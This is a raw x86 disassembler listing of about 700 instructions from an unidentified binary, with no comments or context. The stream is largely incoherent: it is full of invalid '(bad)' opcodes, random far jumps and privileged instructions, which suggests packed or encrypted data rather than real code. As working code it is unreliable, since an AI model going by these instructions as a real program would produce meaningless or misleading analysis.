  416ff4:	dec    eax
  416ff5:	add    BYTE PTR [eax],al
  416ff7:	(bad)  
  416ff9:	retf   0x2982
  416ffc:	mov    WORD PTR [eax+eax*1+0x0],ds
  417000:	sub    eax,0x4ed9d62b
  417005:	mov    BYTE PTR fs:[edi+0x74390000],ch
  41700c:	hlt    
  41700d:	mov    WORD PTR [edi+0x0],?
  417010:	add    al,cl
  417012:	mov    bl,0x0
  417014:	add    cl,bh
  417016:	ficomp WORD PTR [eax+0x64577612]
  41701c:	mov    cl,0xaf
  41701e:	jge    0x417040
  417020:	rcr    DWORD PTR [edx+edx*4+0x444],0x7b
  417028:	cmc    
  417029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702a:	cmc    
  41702b:	fnstsw WORD PTR [edi]
  41702d:	(bad)  
  41702e:	pop    eax
  41702f:	(bad)  
  417030:	test   eax,0x3ac4
  417035:	jle    0x41709f
  417037:	ror    BYTE PTR [edi+0xe9c0],cl
  41703d:	jno    0x4170b8
  41703f:	xor    ch,al
  417041:	mov    ds:0xf2db4e77,al
  417046:	push   0x8b9dfbd1
  41704b:	adc    DWORD PTR [eax],eax
  41704d:	hlt    
  41704e:	add    BYTE PTR [eax],al
  417050:	jmp    0x5844:0x1d476f0
  417057:	add    BYTE PTR [eax],al
  417059:	div    BYTE PTR [ebx-0x53]
  41705c:	dec    eax
  41705d:	imul   eax,DWORD PTR [eax],0xae0e1f00
  417063:	loopne 0x4170c5
  417065:	test   DWORD PTR [edx],0x6e5accb
  41706b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41706c:	pop    edi
  41706d:	enter  0xf1,0x0
  417071:	jo     0x417085
  417073:	int3   
  417074:	pop    edi
  417075:	add    BYTE PTR [eax],al
  417077:	add    esi,DWORD PTR [eax-0x47378ee8]
  41707d:	add    BYTE PTR [eax],al
  41707f:	mul    DWORD PTR [ebp+esi*2+0xa944b8]
  417086:	add    dh,dl
  417088:	fadd   QWORD PTR [ebx]
  41708a:	pop    ebp
  41708b:	ret    
  41708c:	fs dec ebx
  41708e:	push   ds
  41708f:	rcl    BYTE PTR [edx],0x0
  417092:	add    BYTE PTR [ecx-0x8],al
  417095:	push   0xffffff9a
  417097:	jmp    0xba3c:0x9043aafa
  41709e:	xchg   dh,ah
  4170a0:	mov    ds:0x5c4341d3,eax
  4170a5:	cli    
  4170a6:	mov    es,ebp
  4170a8:	je     0x41703f
  4170aa:	adc    BYTE PTR [esi+0x66],cl
  4170ad:	leave  
  4170ae:	fild   DWORD PTR [ecx-0x28e0efa4]
  4170b5:	sbb    DWORD PTR [edi-0x469e0b27],edx
  4170bb:	clc    
  4170bc:	and    DWORD PTR [ecx-0x1b],ecx
  4170bf:	sub    esp,DWORD PTR ds:0x25f9aa45
  4170c5:	and    dl,BYTE PTR [eax+0x50]
  4170c8:	inc    esi
  4170c9:	lods   al,BYTE PTR ds:[esi]
  4170ca:	fimul  DWORD PTR [esi+ecx*8-0x78c30000]
  4170d1:	out    dx,al
  4170d2:	xchg   ecx,eax
  4170d3:	retf   0xfa02
  4170d6:	not    ebp
  4170d8:	push   cs
  4170d9:	or     eax,0x9188c182
  4170de:	add    BYTE PTR [eax],al
  4170e0:	mov    esi,0x5dd062fb
  4170e5:	jmp    0xb0cfa082
  4170ea:	xor    al,0xbe
  4170ec:	ds inc esi
  4170ee:	dec    esp
  4170ef:	inc    DWORD PTR [eax]
  4170f1:	add    BYTE PTR [edx],bl
  4170f3:	mov    ebp,0xfee166a3
  4170f8:	into   
  4170f9:	mov    ecx,0xc19d6436
  4170fe:	loop   0x4170cd
  417100:	push   ds
  417101:	loope  0x4170f0
  417103:	jmp    ecx
  417105:	adc    ebx,DWORD PTR [edi+0x16]
  417108:	ins    BYTE PTR es:[edi],dx
  417109:	pop    edx
  41710a:	and    DWORD PTR cs:[eax+0x73],edi
  41710e:	lods   eax,DWORD PTR ds:[esi]
  41710f:	dec    ebp
  417110:	hlt    
  417111:	adc    edx,DWORD PTR [ebp-0x13]
  417114:	pop    ecx
  417115:	das    
  417116:	cdq    
  417117:	js     0x4170ca
  417119:	xchg   ecx,eax
  41711a:	pop    ss
  41711b:	push   ecx
  41711c:	xchg   esi,eax
  41711d:	cli    
  41711e:	dec    ebp
  41711f:	inc    eax
  417120:	test   DWORD PTR [eax],eax
  417122:	add    BYTE PTR [ebp+0x598417],cl
  417128:	add    BYTE PTR [ecx-0x5e5e52b],ch
  41712e:	xchg   al,dl
  417130:	bound  edx,QWORD PTR [ebx+0x16]
  417133:	stos   DWORD PTR es:[edi],eax
  417134:	or     ebx,eax
  417136:	pop    es
  417137:	loop   0x4170d2
  417139:	fcom   DWORD PTR [esi-0x28]
  41713c:	inc    edi
  41713d:	clc    
  41713e:	das    
  41713f:	popa   
  417140:	mov    eax,0x362029f1
  417145:	stos   BYTE PTR es:[edi],al
  417146:	mov    ds:0xed32cab7,eax
  41714b:	shl    DWORD PTR [edi],cl
  41714d:	mov    bl,0x8c
  41714f:	mov    eax,DWORD PTR [eax]
  417151:	add    BYTE PTR [esp+eax*2],ah
  417154:	add    BYTE PTR [bx+si],al
  417157:	mov    edx,0x8b80e1a1
  41715c:	add    BYTE PTR [eax],al
  41715e:	loope  0x417157
  417160:	dec    esp
  417161:	push   edi
  417162:	add    BYTE PTR [eax],al
  417164:	jnp    0x417124
  417166:	vpxor  xmm2,xmm2,XMMWORD PTR [ebx+edx*1+0x6f]
  41716c:	and    BYTE PTR [eax+esi*8],cl
  41716f:	add    BYTE PTR [eax],al
  417171:	xor    BYTE PTR ds:0x2e8eb47d,dl
  417177:	mov    dh,0xd
  417179:	cmp    BYTE PTR [ebp+0x264d856f],dl
  41717f:	add    edi,esp
  417181:	mov    bl,BYTE PTR [esi+0x61a0fc49]
  417187:	inc    edi
  417188:	jno    0x4171d0
  41718a:	mov    bl,BYTE PTR [edi]
  41718c:	sub    BYTE PTR [edi+0x0],0x0
  417190:	push   edi
  417191:	sbb    ch,BYTE PTR [ebx+0x36ac7d1a]
  417197:	stc    
  417198:	jo     0x417125
  41719a:	sbb    eax,0x41833877
  41719f:	sbb    BYTE PTR ds:0x597db86,bl
  4171a5:	lds    edx,FWORD PTR [edx+0x4a]
  4171a8:	xchg   edx,eax
  4171a9:	mov    ebp,0x5a2feb24
  4171ae:	jae    0x4171ed
  4171b0:	xor    bl,BYTE PTR [esi-0x2d]
  4171b3:	mov    ch,0xb
  4171b5:	loope  0x4171e1
  4171b7:	dec    edi
  4171b8:	push   edi
  4171b9:	dec    eax
  4171ba:	test   BYTE PTR [eax],0x0
  4171bd:	leave  
  4171be:	mov    ecx,DWORD PTR [eax]
  4171c0:	xchg   ebp,eax
  4171c1:	add    BYTE PTR [eax],al
  4171c3:	push   esi
  4171c4:	repnz in al,dx
  4171c6:	cld    
  4171c7:	pop    ebx
  4171c8:	ins    DWORD PTR es:[edi],dx
  4171c9:	ror    DWORD PTR [ecx-0xa118532],0xb1
  4171d0:	mov    BYTE PTR [edi+0x0],bl
  4171d3:	add    BYTE PTR [esi],bh
  4171d5:	dec    esp
  4171d6:	adc    eax,DWORD PTR [eax]
  4171d8:	add    BYTE PTR [edi],ah
  4171da:	cdq    
  4171db:	mov    ds:0xf944,eax
  4171e0:	popa   
  4171e1:	call   0xf949:0x54c6164f
  4171e8:	das    
  4171e9:	jae    0x417269
  4171eb:	hlt    
  4171ec:	jne    0x4171f7
  4171ee:	cwde   
  4171ef:	test   ch,dl
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	les    esi,FWORD PTR [edx+0x3d930000]
  4171f9:	add    eax,0x74fbd60
  4171fe:	pusha  
  4171ff:	arpl   WORD PTR [ecx],dx
  417201:	mov    ah,0xa8
  417203:	cmp    al,0xe
  417205:	ret    0x1826
  417208:	push   esp
  417209:	pop    edi
  41720a:	aam    0xb5
  41720c:	and    bh,ah
  41720e:	sbb    BYTE PTR [ecx+0x2f],ah
  417211:	inc    eax
  417212:	fiadd  DWORD PTR [eax]
  417214:	add    BYTE PTR [edx],ch
  417216:	stos   DWORD PTR es:[edi],eax
  417217:	popa   
  417218:	rcl    BYTE PTR [edx],1
  41721a:	repnz mov bh,0xca
  41721d:	dec    ecx
  41721e:	cmp    DWORD PTR [ebx],eax
  417220:	inc    edi
  417221:	jmp    0x6939:0xbd28b813
  417228:	jl     0x4171fb
  41722a:	aas    
  41722b:	push   ebx
  41722c:	aaa    
  41722d:	cdq    
  41722e:	repnz push 0xffffff8e
  417231:	cmp    bl,BYTE PTR [bp+0xe]
  417235:	rcl    BYTE PTR [esi+0x31c868],1
  41723b:	add    BYTE PTR [ebx-0x75bbed7a],ch
  417241:	add    BYTE PTR [eax],al
  417243:	mov    edi,0x2cc0
  417248:	mov    ch,0xe2
  41724a:	(bad)  
  41724b:	enter  0x30,0x0
  41724f:	loop   0x417224
  417251:	dec    esp
  417252:	repz add BYTE PTR [eax],al
  417255:	jo     0x41721c
  417257:	mov    DWORD PTR [edi+0xd100f6],edi
  41725d:	add    BYTE PTR ds:0xdab57085,dl
  417263:	scas   eax,DWORD PTR es:[edi]
  417264:	iret   
  417265:	mov    ecx,0xd4b5a9ae
  41726a:	add    al,BYTE PTR [edi]
  41726c:	lock and ch,dh
  41726f:	lds    ecx,FWORD PTR [edi+0x505339c7]
  417275:	icebp  
  417276:	push   esi
  417277:	aam    0x85
  417279:	aad    0x8e
  41727b:	loopne 0x417287
  41727d:	add    bh,ah
  41727f:	add    BYTE PTR [eax],al
  417281:	dec    ebx
  417282:	in     al,0xe1
  417284:	xor    esi,esp
  417286:	das    
  417287:	sub    eax,0x8e5991ae
  41728c:	sub    eax,0xc1fb9930
  417291:	and    DWORD PTR [ecx+ebx*2+0x5d],0x7a
  417296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417297:	xor    ch,BYTE PTR [eax]
  417299:	jmp    DWORD PTR [ebp+ebp*4-0x38]
  41729d:	push   es
  41729e:	add    BYTE PTR [eax],al
  4172a0:	jnp    0x417319
  4172a2:	mov    eax,ds:0xd7045e
  4172a7:	add    BYTE PTR [eax],al
  4172a9:	mov    dl,0x0
  4172ab:	add    bh,bh
  4172ad:	call   0x6d2ea393
  4172b2:	mov    al,ds:0x39d9f906
  4172b7:	dec    ebx
  4172b8:	leave  
  4172b9:	int3   
  4172ba:	jl     0x4172bc
  4172bc:	add    BYTE PTR [edi],ah
  4172be:	mov    esp,0x882f57f2
  4172c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172c4:	add    BYTE PTR [eax],al
  4172c6:	mov    ah,0xe9
  4172c8:	inc    ecx
  4172c9:	gs shl DWORD PTR ss:[eax+edi*2],cl
  4172ce:	xor    al,0x4e
  4172d0:	mov    BYTE PTR [eax+eax*1-0x4ec02a00],al
  4172d7:	adc    eax,0xb0df2269
  4172dc:	loopne 0x4172c6
  4172de:	adc    BYTE PTR [edx+0x20],cl
  4172e1:	xchg   esp,eax
  4172e2:	xor    BYTE PTR [ebx+0x42],ah
  4172e5:	out    dx,eax
  4172e6:	mov    eax,0x978cb1
  4172eb:	add    BYTE PTR [edi-0x28],ah
  4172ee:	jle    0x4172e4
  4172f0:	dec    ecx
  4172f1:	in     eax,dx
  4172f2:	cli    
  4172f3:	retf   0x35d
  4172f6:	push   0xf52975bc
  4172fb:	(bad)  
  4172fc:	repnz add BYTE PTR [eax],al
  4172ff:	daa    
  417300:	test   eax,0xdceed132
  417305:	add    dl,BYTE PTR [edi]
  417307:	pusha  
  417308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417309:	in     eax,dx
  41730a:	xor    eax,0x61521838
  41730f:	pop    ecx
  417310:	test   DWORD PTR [edi+0x74451c69],0xdd0c
  41731a:	xchg   edi,eax
  41731b:	or     eax,0x7ebea939
  417320:	cmp    ecx,DWORD PTR [esi-0x24]
  417323:	add    bl,BYTE PTR [edx+esi*4+0x4e]
  417327:	pop    ds
  417328:	cmc    
  417329:	outs   dx,DWORD PTR ds:[esi]
  41732a:	mov    edi,0xb651a1dd
  41732f:	loope  0x4172fa
  417331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417332:	lods   eax,DWORD PTR ds:[esi]
  417333:	or     DWORD PTR [edx+0x2f],edi
  417336:	data16 add al,0xbd
  417339:	add    BYTE PTR [eax],al
  41733b:	sub    ebx,DWORD PTR [edx+0xcc8e0]
  417341:	add    BYTE PTR [ebx+0x77],dl
  417344:	xor    esi,DWORD PTR [ecx-0xd]
  417347:	dec    ebp
  417348:	pop    ebp
  417349:	retf   0xca3a
  41734c:	dec    edi
  41734d:	es xchg esi,eax
  41734f:	pop    ss
  417350:	ins    DWORD PTR es:[edi],dx
  417351:	ss mov cl,0x5e
  417354:	jb     0x4173a4
  417356:	aas    
  417357:	dec    esp
  417358:	in     al,dx
  417359:	add    BYTE PTR [eax],al
  41735b:	sbb    eax,0xe76fab1c
  417360:	cmp    BYTE PTR [esp+eax*2+0x0],al
  417364:	add    cl,cl
  417366:	xchg   esi,eax
  417367:	into   
  417368:	jle    0x4173cb
  41736a:	add    al,0xab
  41736c:	add    BYTE PTR [eax],al
  41736e:	test   DWORD PTR [edi-0x26],esi
  417371:	pop    ebp
  417372:	jb     0x4173b7
  417374:	push   ebp
  417375:	stos   DWORD PTR es:[edi],eax
  417376:	leavew 
  417378:	out    0x5b,al
  41737a:	cli    
  41737b:	inc    edi
  41737c:	lods   al,BYTE PTR ds:[esi]
  41737d:	cmp    BYTE PTR [ebx+esi*4-0x47f3f8d2],ch
  417384:	add    BYTE PTR [eax],al
  417386:	adc    cl,BYTE PTR [esi]
  417388:	cmp    al,0xdf
  41738a:	fmulp  st(0),st
  41738c:	push   cs
  41738d:	add    BYTE PTR [eax],al
  41738f:	push   eax
  417390:	or     esi,0x43
  417393:	inc    esp
  417394:	in     eax,dx
  417395:	add    BYTE PTR [eax],al
  417397:	test   DWORD PTR es:[ebp+ebp*2+0x0],0x752bee00
  4173a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173a1:	push   es
  4173a2:	outs   dx,BYTE PTR ds:[esi]
  4173a3:	clc    
  4173a4:	outs   dx,DWORD PTR ds:[esi]
  4173a5:	lods   al,BYTE PTR ds:[esi]
  4173a6:	stc    
  4173a7:	outs   dx,DWORD PTR ds:[esi]
  4173a8:	add    al,ah
  4173aa:	fwait
  4173ab:	add    BYTE PTR [eax],al
  4173ad:	push   edi
  4173ae:	int3   
  4173af:	scas   eax,DWORD PTR es:[edi]
  4173b0:	add    BYTE PTR [eax],al
  4173b2:	imul   eax,DWORD PTR [edi],0x47e2a676
  4173b8:	mov    edi,0x72792605
  4173bd:	jno    0x417342
  4173bf:	dec    edi
  4173c0:	call   0xcc85:0x5b0a7834
  4173c7:	add    BYTE PTR ss:[eax],al
  4173ca:	loope  0x4173ae
  4173cc:	add    bl,0xfe
  4173cf:	xor    al,0x4c
  4173d1:	fld    QWORD PTR [eax]
  4173d3:	add    al,al
  4173d5:	mov    DWORD PTR [eax],eax
  4173d7:	add    ch,cl
  4173d9:	js     0x4173ad
  4173db:	neg    BYTE PTR [ecx]
  4173dd:	and    eax,0xd3519ca9
  4173e2:	loope  0x4173cc
  4173e4:	gs shr bl,1
  4173e7:	inc    esp
  4173e8:	lds    eax,FWORD PTR [eax]
  4173ea:	add    BYTE PTR [edi+0x3d7302f3],bl
  4173f0:	mov    eax,0xe8ccb2e6
  4173f5:	add    BYTE PTR [eax],al
  4173f7:	lahf   
  4173f8:	xchg   edi,eax
  4173f9:	popa   
  4173fa:	outs   dx,DWORD PTR ds:[esi]
  4173fb:	inc    esi
  4173fc:	mov    eax,ds:0x4db0a97d
  417401:	jne    0x417435
  417403:	xchg   ebp,eax
  417404:	jnp    0x4173fc
  417406:	dec    ecx
  417407:	test   eax,0x3df0a79c
  41740c:	xchg   ebp,eax
  41740d:	pop    es
  41740e:	push   0xffffffca
  417410:	leave  
  417411:	out    0x4,al
  417413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417414:	add    BYTE PTR [eax],al
  417416:	fs pop esp
  417419:	out    0x0,al
  41741b:	add    BYTE PTR [eax],ch
  41741d:	push   cs
  41741e:	dec    esp
  41741f:	or     al,0x0
  417421:	add    BYTE PTR [ebp+0x79f01ce4],dl
  417427:	mov    dl,0xe3
  417429:	jbe    0x4173c3
  41742b:	xchg   edi,eax
  41742c:	out    0x5c,al
  41742e:	inc    ebx
  41742f:	sbb    edi,edx
  417431:	push   eax
  417432:	jmp    0xab43:0x6abdf657
  417439:	fstp   DWORD PTR [eax+0x63a2ecf1]
  41743f:	gs retf 0xdce4
  417443:	and    al,0x39
  417445:	call   0x914c:0xf28b5a90
  41744c:	add    BYTE PTR [eax],al
  41744e:	xchg   edi,eax
  41744f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417450:	sbb    eax,0x8008
  417455:	out    0xac,al
  417457:	ret    0x68ea
  41745a:	xor    al,BYTE PTR [esi-0x6d]
  41745d:	inc    ebp
  41745e:	mov    esp,0x5fe23735
  417463:	or     ch,BYTE PTR [esi]
  417465:	scas   al,BYTE PTR es:[edi]
  417466:	lods   eax,DWORD PTR ds:[esi]
  417467:	xchg   BYTE PTR [ebp+0x7b14ae55],bh
  41746d:	les    esp,FWORD PTR [edx+0x343e0000]
  417473:	dec    edx
  417474:	xchg   ecx,eax
  417475:	ficom  DWORD PTR [ebx-0x30]
  417478:	adc    al,0x3b
  41747a:	inc    ebx
  41747b:	jg     0x417418
  41747d:	out    0x3e,eax
  41747f:	mov    BYTE PTR [eax+0x0],bh
  417482:	add    BYTE PTR [ebx-0x3a9ae476],dl
  417488:	sbb    dh,BYTE PTR [ecx]
  41748a:	cmp    ch,BYTE PTR ds:0x75ee59ba
  417490:	xor    ch,dl
  417492:	out    dx,al
  417493:	sub    BYTE PTR [ebx],ah
  417495:	popa   
  417496:	adc    BYTE PTR [ebp+0x61979398],ch
  41749c:	xchg   ebp,eax
  41749d:	cmp    al,0xf2
  41749f:	in     eax,dx
  4174a0:	lods   al,BYTE PTR ds:[esi]
  4174a1:	jo     0x41746e
  4174a3:	adc    dl,BYTE PTR [ecx+0x43]
  4174a6:	dec    edx
  4174a7:	fidivr DWORD PTR [ecx]
  4174a9:	aas    
  4174aa:	outs   dx,BYTE PTR ds:[esi]
  4174ab:	jbe    0x417494
  4174ad:	lods   al,BYTE PTR ds:[esi]
  4174ae:	and    al,0xfb
  4174b0:	aam    0x1c
  4174b2:	jns    0x4174b9
  4174b4:	(bad)  
  4174b5:	outs   dx,BYTE PTR ds:[esi]
  4174b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174b7:	adc    DWORD PTR [eax+eax*4],0x7000024
  4174be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bf:	or     bl,dl
  4174c1:	add    BYTE PTR [eax],al
  4174c3:	ds cwde 
  4174c5:	mov    al,0x2
  4174c7:	push   ebx
  4174c8:	xlat   BYTE PTR ds:[ebx]
  4174c9:	and    DWORD PTR [ebp-0x6e5dc287],esi
  4174cf:	gs jae 0x4174d2
  4174d2:	ja     0x4174d4
  4174d4:	add    bh,al
  4174d6:	mov    eax,0x371e2a73
  4174db:	pop    edx
  4174dc:	and    ah,BYTE PTR [ecx]
  4174de:	add    al,0xdd
  4174e0:	add    BYTE PTR [eax],al
  4174e2:	jns    0x417534
  4174e4:	push   esi
  4174e5:	ins    DWORD PTR es:[edi],dx
  4174e6:	push   ebp
  4174e7:	outs   dx,BYTE PTR ds:[esi]
  4174e8:	pop    eax
  4174e9:	xchg   edi,eax
  4174ea:	push   ecx
  4174eb:	jb     0x41748f
  4174ed:	mov    ebp,DWORD PTR [ebp+edi*1+0x56]
  4174f1:	test   al,0x5a
  4174f3:	xor    BYTE PTR [esi+0x1c5839fc],cl
  4174f9:	add    ah,BYTE PTR [edi-0x13]
  4174fc:	mov    ecx,0x6878ef66
  417501:	sbb    dh,BYTE PTR [ebx-0x20]
  417504:	cmc    
  417505:	enter  0xce,0x0
  417509:	push   ds
  41750a:	in     al,dx
  41750b:	or     eax,0x64e4654
  417510:	xor    al,0x5a
  417512:	pop    ebp
  417513:	and    DWORD PTR [edi-0x2c],ecx
  417516:	iret   
  417517:	cwde   
  417518:	pop    ss
  417519:	jmp    0xecc3:0x7d5211cb
  417520:	mov    ?,WORD PTR [esi+0x29]
  417523:	cmc    
  417524:	dec    edi
  417525:	ret    
  417526:	xlat   BYTE PTR ds:[ebx]
  417527:	xor    edi,ebx
  417529:	jecxz  0x417539
  41752b:	and    dl,BYTE PTR [eax-0x463f2d9]
  417531:	add    al,0x6f
  417533:	add    BYTE PTR [eax],al
  417535:	dec    BYTE PTR [eax+0x62]
  417538:	add    BYTE PTR [eax],al
  41753a:	xchg   esp,eax
  41753b:	das    
  41753c:	and    dl,BYTE PTR [ebx]
  41753e:	stos   DWORD PTR es:[edi],eax
  41753f:	push   edi
  417540:	cs pop es
  417542:	(bad)  
  417543:	fadd   QWORD PTR [eax]
  417545:	add    BYTE PTR [edi-0x1faa9652],bh
  41754b:	aaa    
  41754c:	out    dx,al
  41754d:	or     al,0x1a
  41754f:	add    BYTE PTR [eax],al
  417551:	cmp    BYTE PTR [ebp-0x42],bh
  417554:	ja     0x4175b3
  417556:	les    esp,FWORD PTR [eax-0x43170000]
  41755c:	mov    cl,0xff
  41755e:	xchg   edi,eax
  41755f:	jmp    0xc44832a5
  417564:	pop    edi
  417565:	add    BYTE PTR [eax],al
  417567:	mov    bl,0xa0
  417569:	pop    edx
  41756a:	push   esp
  41756b:	daa    
  41756c:	cdq    
  41756d:	sub    bh,BYTE PTR [ecx]
  41756f:	mov    ah,0x8f
  417571:	pusha  
  417572:	jmp    0x8f6c:0x29bee298
  417579:	sbb    BYTE PTR ds:0x64a89de3,bl
  41757f:	mov    edx,0x7ed03173
  417584:	out    0xc9,eax
  417586:	popf   
  417587:	(bad)  
  417588:	mov    eax,0x67fcb6db
  41758d:	dec    esi
  41758e:	(bad)  
  41758f:	(bad)  
  417590:	fst    QWORD PTR [eax+0x43]
  417593:	inc    ecx
  417594:	and    al,0x10
  417596:	adc    al,0xa
  417598:	dec    ebp
  417599:	cmp    DWORD PTR ds:0x13676a05,edi
  41759f:	shr    DWORD PTR [ebp+0x21],cl
  4175a2:	sub    ecx,DWORD PTR [ecx-0x20189df1]
  4175a8:	mov    ebx,DWORD PTR [esi-0x44a545cd]
  4175ae:	popa   
  4175af:	and    ch,BYTE PTR [edi+ecx*2+0x34]
  4175b3:	add    dl,BYTE PTR ds:0x256d6cb9
  4175b9:	jmp    0x23d5d6cc
  4175be:	jne    0x417552
  4175c0:	rcr    BYTE PTR [ecx-0x2e0751a7],cl
  4175c6:	fisub  WORD PTR [eax-0x2a4974b7]
  4175cc:	lods   eax,DWORD PTR ds:[esi]
  4175cd:	cmp    bh,BYTE PTR [ebx-0x24]
  4175d0:	lahf   
  4175d1:	dec    esp
  4175d2:	adc    BYTE PTR [eax],al
  4175d4:	add    BYTE PTR [edi],ch
  4175d6:	iret   
  4175d7:	xchg   ebx,eax
  4175d8:	fsub   DWORD PTR [ecx+edx*8-0x55]
  4175dc:	inc    ecx
  4175dd:	cmc    
  4175de:	adc    BYTE PTR [esp+edi*8],bh
  4175e1:	sub    DWORD PTR [edx-0x1194d82a],edi
  4175e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e8:	call   0x8f1b0ca9
  4175ed:	mov    cl,0x59
  4175ef:	loopne 0x417613
  4175f1:	xchg   edx,eax
  4175f2:	xchg   ebx,eax
  4175f3:	push   0x47c4
  4175f8:	test   DWORD PTR ds:0x5213b3db,ecx
  4175fe:	(bad)  
  4175ff:	xchg   edx,eax
  417600:	mov    BYTE PTR [edx+0x0],bh
  417603:	add    BYTE PTR [ecx+esi*4-0x32e4cc04],dh
  41760a:	test   al,0x8c
  41760c:	push   0x8ff70000
  417611:	mov    dl,BYTE PTR [ebx-0x42]
  417614:	iret   
  417615:	in     eax,0x11
  417617:	enter  0x79,0x0
  41761b:	aam    0xa5
  41761d:	aad    0xfd
  41761f:	lock add cl,ch
  417622:	add    BYTE PTR [eax],al
  417624:	mov    eax,ds:0xa66c7bf3
  417629:	xor    bh,al
  41762b:	mov    dl,0x6e
  41762d:	pop    esp
  41762e:	mov    ch,0xde
  417630:	and    al,0xa7
  417632:	push   ds
  417633:	jae    0x41760a
  417635:	ins    DWORD PTR es:[edi],dx
  417636:	sub    esp,esi
  417638:	fwait
  417639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41763a:	add    ch,BYTE PTR [ebx+0xab2d28]
  417640:	add    BYTE PTR gs:[eax],al
  417643:	sub    DWORD PTR [esp+ebp*2-0x64],ebp
  417647:	sar    BYTE PTR [ecx],cl
  417649:	bound  edi,QWORD PTR [eax]
  41764b:	mov    bh,0x1a
  41764d:	loope  0x4175f8
  41764f:	push   edx
  417650:	(bad)  
  417651:	jbe    0x4176c1
  417653:	jo     0x41763f
  417655:	jmp    FWORD PTR [ecx-0x3d52df6a]
  41765b:	pop    eax
  41765c:	mov    ch,0x7a
  41765e:	aaa    
  41765f:	mov    bh,0x84
  417661:	scas   eax,DWORD PTR es:[edi]
  417662:	add    BYTE PTR [eax],al
  417664:	les    ebp,FWORD PTR [eax]
  417666:	add    BYTE PTR [eax],al
  417668:	fisubr DWORD PTR [esi]
  41766a:	push   eax
  41766b:	push   esp
  41766c:	in     al,dx
  41766d:	ja     0x4176cb
  41766f:	(bad)  
  417670:	test   BYTE PTR [esi-0x31d0000],bh
  417676:	adc    edx,DWORD PTR [ebx+0x50b38a41]
  41767c:	jae    0x4176eb
  41767e:	sub    eax,0x44b5b4d7
  417683:	in     eax,0x0
  417685:	add    BYTE PTR [edx+ebx*8-0x5d8fc9f5],dl
  41768c:	popf   
  41768d:	outs   dx,DWORD PTR ds:[esi]
  41768e:	jmp    0x417672
  417690:	jns    0x417643
  417692:	jne    0x417701
  417694:	xchg   esp,eax
  417695:	outs   dx,BYTE PTR ds:[esi]
  417696:	test   al,0x6b
  417698:	sub    al,0xf
  41769a:	call   0xe595499a
  41769f:	test   BYTE PTR [edx],bl
  4176a1:	add    BYTE PTR [eax],al
  4176a3:	mov    bh,0x68
  4176a5:	pushf  
  4176a6:	ret    0x27f2
  4176a9:	add    DWORD PTR [edi-0x62680d4c],0xe3b1aa32
  4176b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176b4:	xor    BYTE PTR [esi-0x4c],bl
  4176b7:	xchg   esp,eax
  4176b8:	xor    eax,ebx
  4176ba:	xchg   esp,eax
  4176bb:	push   eax
  4176bc:	leave  
  4176bd:	pop    esi
  4176be:	mov    ebp,0x2f594ff7
  4176c3:	and    al,BYTE PTR [esi+0x2bc4ee]
  4176c9:	add    BYTE PTR [ebx],al
  4176cb:	lods   al,BYTE PTR ds:[esi]
  4176cc:	add    DWORD PTR [di+0x657c],ebx
  4176d1:	adc    edi,DWORD PTR gs:[eax+0x3]
  4176d5:	(bad)  
  4176d6:	addr16 xchg esp,eax
  4176d8:	bound  edx,QWORD PTR [ebx+0x379b1c15]
  4176de:	aam    0x53
  4176e0:	adc    eax,0xb8cd61ea
  4176e5:	lea    eax,[eax-0x2e]
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	sub    BYTE PTR [eax+0x5764ae4e],dh
  4176f0:	add    eax,0x1283dc85
  4176f5:	out    dx,eax
  4176f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f7:	mov    ah,0x22
  4176f9:	stos   BYTE PTR es:[edi],al
  4176fa:	stc    
  4176fb:	inc    ebp
  4176fc:	cmc    
  4176fd:	inc    esp
  4176fe:	scas   al,BYTE PTR es:[edi]
  4176ff:	add    BYTE PTR [eax],al
  417701:	std    
  417702:	jmp    0x417761
  417704:	lahf   
  417705:	lds    esi,FWORD PTR [edi]
  417707:	pop    ss
  417708:	sub    al,0x16
  41770a:	cmp    edx,esp
  41770c:	mov    cs,WORD PTR ds:0xebb6f292
  417712:	adc    edx,ecx
  417714:	(bad)  
  417715:	scas   al,BYTE PTR es:[edi]
  417716:	sub    eax,0x9bab3541
  41771b:	ss xor al,0x5f
  41771e:	sti    
  41771f:	into   
  417720:	fiadd  DWORD PTR [ecx+0x22]
  417723:	cwde   
  417724:	hlt    
  417725:	mov    bh,0x3d
  417727:	enter  0xff,0x0
  41772b:	and    al,0x3c
  41772d:	lds    edx,FWORD PTR [ecx-0xd285212]
  417733:	push   esi
  417734:	add    al,0xbb
  417736:	add    BYTE PTR [eax],al
  417738:	mov    eax,ds:0xf3160e0b
  41773d:	adc    ah,0x9c
  417740:	sub    edi,DWORD PTR [ecx+ebp*8]
  417743:	call   DWORD PTR [eax-0x62]
  417746:	adc    eax,ebp
  417748:	into   
  417749:	xor    al,0x59
  41774b:	cmp    al,0xda
  41774d:	je     0x41776b
  41774f:	cwde   
  417750:	call   0xf120b00b
  417755:	jg     0x4176ea
  417757:	adc    dl,BYTE PTR [ebp-0x3b]
  41775a:	sar    DWORD PTR [ebx+0x1df61394],cl
  417760:	mov    edx,DWORD PTR [ebp+0x4d98d5]
  417766:	aad    0x0
  417768:	add    BYTE PTR [ebp+0x3916c70],bh
  41776e:	imul   esp,DWORD PTR [edx+0x5920cd01],0x2edf73d2
  417778:	add    dh,BYTE PTR [edi]
  41777a:	enter  0xe7,0x0
  41777e:	or     eax,0xf55b94a7
  417783:	mov    ds,WORD PTR ds:0x227b9a95
  417789:	out    0x3e,eax
  41778b:	(bad)  
  41778c:	inc    ecx
  41778d:	mov    edx,0x1e17f279
  417792:	mov    ebx,DWORD PTR [ebp+0xd]
